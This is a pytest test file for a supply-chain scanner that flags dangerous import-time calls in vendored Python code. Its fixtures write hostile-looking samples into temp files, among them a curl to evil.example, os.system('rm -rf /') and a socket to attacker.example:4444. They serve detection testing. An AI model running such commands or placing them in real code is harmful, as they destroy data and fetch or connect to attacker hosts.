"""Tests for ``packages.sca.supply_chain.python_imports``."""

from __future__ import annotations

from pathlib import Path

from packages.sca.supply_chain.python_imports import scan_target


def _write(p: Path, body: str) -> None:
    """Write ``body`` to ``p``. Tests use a ``vendor/`` subdir so the
    detector's scope filter (only fires on third-party / vendored
    code, not operator code) is satisfied — without that, every
    test would write to ``tmp_path`` directly and the detector
    would skip them all because they look like operator code."""
    if not any(part in {"vendor", "_vendor", "third_party",
                         "thirdparty", "external"} for part in p.parts):
        p = p.parent / "vendor" / p.name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(body, encoding="utf-8")


# ---------------------------------------------------------------------------
# Should flag
# ---------------------------------------------------------------------------

def test_subprocess_run_at_module_top_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", """\
import subprocess
subprocess.run(["curl", "https://evil.example/x.sh"])
""")
    findings = scan_target(tmp_path, [])
    assert len(findings) == 1
    assert "subprocess.run()" in findings[0].detail


def test_os_system_at_module_top_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", "import os\nos.system('rm -rf /')\n")
    findings = scan_target(tmp_path, [])
    assert any("os.system" in f.detail for f in findings)


def test_eval_at_module_top_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", "eval('__import__(\"os\")')\n")
    findings = scan_target(tmp_path, [])
    assert any("eval()" in f.detail for f in findings)


def test_dunder_import_at_module_top_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", "x = __import__('os.path')\n")
    findings = scan_target(tmp_path, [])
    assert any("__import__()" in f.detail for f in findings)


def test_requests_get_at_module_top_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", """\
import requests
data = requests.get("https://evil.example/data").json()
""")
    findings = scan_target(tmp_path, [])
    assert any("requests.get" in f.detail for f in findings)


def test_socket_create_connection_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", """\
import socket
s = socket.create_connection(("attacker.example", 4444))
""")
    findings = scan_target(tmp_path, [])
    assert any("socket.create_connection" in f.detail for f in findings)


def test_call_inside_try_block_at_module_scope_flagged(tmp_path: Path) -> None:
    """try: subprocess.run(...); except: pass — still runs at import."""
    _write(tmp_path / "evil.py", """\
import subprocess
try:
    subprocess.run(["whoami"])
except Exception:
    pass
""")
    findings = scan_target(tmp_path, [])
    assert any("subprocess.run" in f.detail for f in findings)


# ---------------------------------------------------------------------------
# Should NOT flag
# ---------------------------------------------------------------------------

def test_imports_alone_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
import os
import subprocess
from urllib import request
""")
    assert scan_target(tmp_path, []) == []


def test_function_body_calls_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
import subprocess
def run_thing():
    subprocess.run(["ls"])
""")
    assert scan_target(tmp_path, []) == []


def test_class_body_calls_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
import os
class Helper:
    def go(self):
        os.system("date")
""")
    assert scan_target(tmp_path, []) == []


def test_main_guard_body_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
import subprocess

if __name__ == "__main__":
    subprocess.run(["echo", "running as a script"])
""")
    assert scan_target(tmp_path, []) == []


def test_type_checking_guard_body_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    import requests   # for type hints only
""")
    assert scan_target(tmp_path, []) == []


def test_module_constants_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
NAME = "my-pkg"
VERSION = "0.1.0"
DEFAULTS = {"timeout": 30, "retries": 3}
ALLOWED = ("a", "b", "c")
""")
    assert scan_target(tmp_path, []) == []


def test_docstrings_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", '"""Module docstring."""\nimport os\n')
    assert scan_target(tmp_path, []) == []


def test_test_directories_skipped(tmp_path: Path) -> None:
    """Test code legitimately spins up subprocesses at module scope."""
    _write(tmp_path / "tests" / "conftest.py", """\
import subprocess
subprocess.run(["pip", "install", "-e", "."])
""")
    assert scan_target(tmp_path, []) == []


def test_vendored_dirs_skipped(tmp_path: Path) -> None:
    _write(tmp_path / ".venv" / "lib" / "site-packages" / "evil.py", """\
import os
os.system("malicious")
""")
    assert scan_target(tmp_path, []) == []


def test_syntax_errors_skip_file_not_whole_walk(tmp_path: Path) -> None:
    _write(tmp_path / "bad.py", "def broken(:\n  pass")
    _write(tmp_path / "ok.py", "import os\nos.system('whoami')\n")
    findings = scan_target(tmp_path, [])
    # Bad file silently skipped; good file still flagged.
    assert len(findings) == 1
    assert "ok.py" in str(findings[0].path)


def test_call_to_unrelated_module_not_flagged(tmp_path: Path) -> None:
    """A top-level call to a module we don't have on the suspicious
    list (e.g., `logging.basicConfig`) is allowed — many libraries do
    this legitimately."""
    _write(tmp_path / "ok.py", """\
import logging
logging.basicConfig(level=logging.INFO)
""")
    assert scan_target(tmp_path, []) == []


# ---------------------------------------------------------------------------
# Scope filter — only fires inside vendor trees, never on operator code
# ---------------------------------------------------------------------------


def test_operator_code_outside_vendor_not_flagged(tmp_path: Path) -> None:
    """A top-level subprocess.run() in operator-written code (i.e.
    NOT inside a vendor tree) is benign hygiene, not a supply-chain
    risk. The detector must skip it — operator code is trusted, the
    heuristic is for third-party content only.

    Without this guard, scanning a project that does anything at
    import time (config loading, env var reads, cpu count detection)
    drowns the report in false positives."""
    # Write directly to tmp_path, bypassing the _write helper's
    # vendor/ rerouting.
    p = tmp_path / "app.py"
    p.write_text(
        "import subprocess\n"
        "subprocess.run(['echo', 'hi'])\n",
        encoding="utf-8",
    )
    findings = scan_target(tmp_path, [])
    assert findings == [], (
        "operator code (no vendor/ ancestor) must NOT fire the "
        "supply-chain heuristic"
    )


def test_vendor_tree_code_still_fires(tmp_path: Path) -> None:
    """Companion to the above: code under a recognised vendor tree
    DOES fire. Defends the inverse case — without this we'd
    accidentally disable the detector entirely."""
    (tmp_path / "vendor").mkdir()
    p = tmp_path / "vendor" / "evil.py"
    p.write_text(
        "import subprocess\n"
        "subprocess.run(['curl', 'https://evil.example/x'])\n",
        encoding="utf-8",
    )
    findings = scan_target(tmp_path, [])
    assert len(findings) == 1


def test_third_party_alias_also_recognised(tmp_path: Path) -> None:
    """``third_party/`` is the alternate vendor convention (Go-style,
    used by some Python projects too). Same scope behaviour as
    ``vendor/``."""
    (tmp_path / "third_party" / "lib").mkdir(parents=True)
    p = tmp_path / "third_party" / "lib" / "init.py"
    p.write_text("import os\nos.system('whoami')\n", encoding="utf-8")
    findings = scan_target(tmp_path, [])
    assert any("os.system" in f.detail for f in findings)
